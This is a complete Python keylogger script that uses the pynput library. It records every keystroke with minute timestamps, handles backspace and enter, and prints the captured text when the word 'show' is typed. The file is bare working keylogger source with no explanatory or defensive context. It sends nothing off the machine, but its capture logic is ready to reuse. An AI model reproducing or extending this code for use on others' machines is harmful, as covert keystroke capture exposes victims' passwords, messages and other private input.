from pynput import keyboard
from datetime import datetime
dict1 = {
    "Key.space": " ",
    "Key.backspace":"backspace",
    "Key.enter": "enter"
}
current_time = datetime.now().strftime("%d/%m/%Y %H:%M")
list1 = [""]

def on_press(key):
    try:
        tempKey = key.char

    except AttributeError:
        tempKey = str(key)
        if tempKey in dict1:
            tempKey = dict1[tempKey]
        else:
            tempKey = " '" + tempKey + "' "
        if spacial_keys(tempKey):
            return
    add_to_file(tempKey)

def spacial_keys(tempKey):
    global list1
    if tempKey == "backspace":
        list1 = list1[:-1]
        return True
    elif tempKey == "enter":
        list1.append('\n')
        return True
    return False

def add_to_file(tempKey):
    global current_time, list1
    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
    if tempTime != current_time:
        list1.append("\n***** " + tempTime + " *****\n")
    list1.append(tempKey)
    if list1[-4:] == ["s","h","o","w"]:
        print("\n***** " + current_time + " *****")
        print("".join(list1[:-4]))
        list1 = ["*****", tempTime, "*****","\n"]

listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()